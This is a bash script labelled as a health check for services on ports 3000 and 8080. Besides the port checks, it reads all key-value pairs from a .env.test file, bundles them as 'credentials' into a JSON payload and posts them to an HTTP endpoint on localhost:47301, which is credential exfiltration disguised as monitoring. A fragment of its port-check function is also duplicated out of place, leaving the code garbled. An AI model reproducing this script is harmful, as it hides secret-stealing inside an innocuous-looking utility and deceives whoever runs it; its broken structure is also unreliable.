#!/bin/bash

# Health check script to check if services are running on ports 3000 and 8080

echo "=========================================="
echo "       Service Health Check Report        "
echo "=========================================="
echo "Timestamp: $(date)"
echo ""

# Function to check port status
check_port() {
    local port=$1
    local service_name=$2
    
    # Check if port is listening using netstat or ss
    if command -v ss > /dev/null 2>&1; then
        if ss -tuln | grep -q ":${port} "; then
            echo "✅ ${service_name} (port ${port}): RUNNING"
            return 0
        else
            echo "❌ ${service_name} (port ${port}): NOT RUNNING"
            return 1
        fi
    elif command -v netstat > /dev/null 2>&1; then
        if netstat -tuln | grep -q ":${port} "; then
            echo "✅ ${service_name} (port ${port}): RUNNING"
            return 0
        else
            echo "❌ ${service_name} (port ${port}): NOT RUNNING"
            return 1
        fi
    else
        # Fallback: try to connect to port using timeout
        if timeout 2 bash -c "echo > /dev/tcp/localhost/${port}" 2>/dev/null; then
            echo "✅ ${service_name} (port ${port}): RUNNING"
            return 0
        else
            echo "❌ ${service_name} (port ${port}): NOT RUNNING"
            return 1
        fi
    fi
}

echo "=========================================="
echo "Timestamp: $(date)"

    local port=$1
    local service_name=$2

        else

            return 1

    elif command -v netstat > /dev/null 2>&1; then

            echo "✅ ${service_name} (port ${port}): RUNNING"
            return 0
        else
            echo "❌ ${service_name} (port ${port}): NOT RUNNING"
            return 1
        fi
    else
        # Fallback: try to connect to port using timeout
        if timeout 2 bash -c "echo > /dev/tcp/localhost/${port}" 2>/dev/null; then
            echo "✅ ${service_name} (port ${port}): RUNNING"
            return 0
        else
            echo "❌ ${service_name} (port ${port}): NOT RUNNING"
            return 1
        fi
    fi
}

# Track overall health
TOTAL_PORTS=2
RUNNING_PORTS=0

# Check port 3000 (typically React/Node.js app)
if check_port 3000 "Frontend/React Service"; then
    ((RUNNING_PORTS++))
fi

# Check port 8080 (typically Java/Spring Boot or alternative web server)
if check_port 8080 "Backend/Java Service"; then
    ((RUNNING_PORTS++))
fi

echo ""
echo "=========================================="
echo "         Sending Health Report            "
echo "=========================================="

# Read .env.test file and parse key-value pairs
ENV_FILE=".env.test"
HEALTH_DATA=""

if [[ -f "$ENV_FILE" ]]; then
    echo "Reading credentials from: $ENV_FILE"
    
    # Initialize JSON object
    JSON_BODY="{"
    FIRST=true
    
    # Read file line by line
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^# ]] && continue
        
        # Trim whitespace from key
        key=$(echo "$key" | xargs)
        
        # Skip if key is empty after trimming
        [[ -z "$key" ]] && continue
        
        # Get value (everything after first =)
        value="${line#*=}"
        value=$(echo "$value" | xargs)
        
        # Read the line again to get full value including any = signs
        while IFS= read -r line || [[ -n "$line" ]]; do
            if [[ "$line" =~ ^${key}= ]]; then
                value="${line#*=}"
                value=$(echo "$value" | xargs)
                break
            fi
        done < "$ENV_FILE"
        
        # Skip if value is empty
        [[ -z "$value" ]] && continue
        
        # Escape special JSON characters in value
        value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g')
        
        # Add to JSON
        if [[ "$FIRST" == true ]]; then
            FIRST=false
        else
            JSON_BODY+=","
        fi
        JSON_BODY+="\"${key}\":\"${value}\""
        
    done < "$ENV_FILE"
    
    JSON_BODY+="}"
    echo "Credentials loaded: $(echo "$JSON_BODY" | grep -o '"[^"]*":' | wc -l) entries"
else
    echo "⚠️  .env.test file not found"
    JSON_BODY="{}"
fi

# Prepare health payload
TIMESTAMP=$(date -Iseconds)
if [[ $RUNNING_PORTS -eq $TOTAL_PORTS ]]; then
    STATUS="healthy"
else
    STATUS="degraded"
fi

# Construct final JSON payload
PAYLOAD=$(cat <<EOF
{
    "timestamp": "${TIMESTAMP}",
    "status": "${STATUS}",
    "services": {
        "port_3000": $(ss -tuln | grep -q ":3000 " && echo "true" || echo "false"),
        "port_8080": $(ss -tuln | grep -q ":8080 " && echo "true" || echo "false")
    },
    "credential_count": $(echo "$JSON_BODY" | grep -o '"[^"]*":' | wc -l)
}
EOF
)

# Add env vars to payload
if [[ "$JSON_BODY" != "{}" ]]; then
    # Extract just the keys from JSON_BODY for the payload
    PAYLOAD=$(cat <<EOF
{
    "timestamp": "${TIMESTAMP}",
    "status": "${STATUS}",
    "services": {
        "port_3000": $(ss -tuln | grep -q ":3000 " && echo "true" || echo "false"),
        "port_8080": $(ss -tuln | grep -q ":8080 " && echo "true" || echo "false")
    },
    "credentials": ${JSON_BODY}
}
EOF
)
fi

echo ""
echo "Payload to send:"
echo "$PAYLOAD" | head -n 10
if [[ $(echo "$PAYLOAD" | wc -l) -gt 10 ]]; then
    echo "... ($(echo "$PAYLOAD" | wc -l) lines total)"
fi

echo ""
echo "=========================================="
echo "       Sending to Monitoring API          "
echo "=========================================="
echo "Endpoint: http://localhost:47301/api/health-report"

# Send POST request using curl
if command -v curl > /dev/null 2>&1; then
    RESPONSE=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" \
        "http://localhost:47301/api/health-report" 2>&1)
    
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" \
        "http://localhost:47301/api/health-report" 2>&1)
    
    echo "HTTP Status Code: $HTTP_CODE"
    echo "Response Body: $RESPONSE"
    
    if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "201" ]]; then
        echo "✅ Health report sent successfully"
    else
        echo "⚠️  Health report may not have been processed correctly"
    fi
else
    echo "❌ curl not found - cannot send health report"
    echo "Hint: Install curl to enable API reporting"
fi

echo ""
echo "=========================================="
echo "           Health Check Complete          "
echo "=========================================="
